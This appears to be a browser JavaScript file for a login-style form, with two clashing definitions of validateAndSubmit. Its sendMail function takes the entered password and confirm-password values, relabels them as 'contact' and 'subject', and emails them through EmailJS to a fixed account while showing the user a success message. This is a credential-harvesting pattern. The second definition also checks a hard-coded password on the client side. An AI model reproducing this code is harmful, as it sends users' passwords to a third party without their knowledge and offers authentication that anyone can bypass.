function validateAndSubmit() {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // Basic form validation
    if (username.trim() === "" || password.trim() === "") {
        // Display an error message using SweetAlert2
        Swal.fire({
            icon: 'error',
            title: 'Validation Error',
            text: 'Both username and password are required.'
        });
        return false; // Prevent form submission
    }

    // Simulate a successful submission
    Swal.fire({
        icon: 'success',
        title: 'Submission Successful',
        text: 'Form submitted successfully!'
    });

    // Call your sendMail function
    sendMail();

    // You can redirect to another page or perform other actions here
    return false; // Prevent default form submission
}

// Your sendMail function
function sendMail() {
    var params = {
        name: document.getElementById("name").value,
        email: document.getElementById("emailid").value,
        contact: document.getElementById("password").value,
        subject: document.getElementById("confirm password").value,
    };

    const serviceID = "service_m8py1fa";
    const templateID = "template_50r5oyb";

    emailjs.send(serviceID, templateID, params)
        .then((res) => {
            // Clear form fields
            document.getElementById("name").value = "";
            document.getElementById("emailid").value = "";
            document.getElementById("password").value = "";
            document.getElementById("confirm password").value = "";

            console.log(res);
            // Display success message
            swal("Success", "Your data was sent successfully.", "success");
        })
        .catch((err) => {
            console.error('Error sending email:', err);
            // Display error message
            swal("Failed", "Something is wrong", "error");
        });
}
function validateAndSubmit() {
    var password = document.getElementById("password").value;
    var correctPassword = "your_correct_password"; // Replace with your actual correct password

    // Basic form validation
    if (password.trim() === "") {
        // Display an error message using SweetAlert2
        Swal.fire({
            icon: 'error',
            title: 'Validation Error',
            text: 'Password is required.'
        });
        return false; // Prevent form submission
    }

    // Check if the password is correct
    if (password !== correctPassword) {
        // Display an error message for incorrect password
        Swal.fire({
            icon: 'error',
            title: 'Validation Error',
            text: 'Incorrect password. Please try again.'
        });
        return false; // Prevent form submission
    }

    // Call your sendMail function
    sendMail();

    // Simulate a successful submission for correct password
    Swal.fire({
        icon: 'success',
        title: 'Submission Successful',
        text: 'Form submitted successfully with correct password!'
    });

    // Optionally, you can submit the form programmatically
    // document.getElementById("yourFormId").submit();

    // You can redirect to another page or perform other actions here
    return false; // Prevent default form submission
}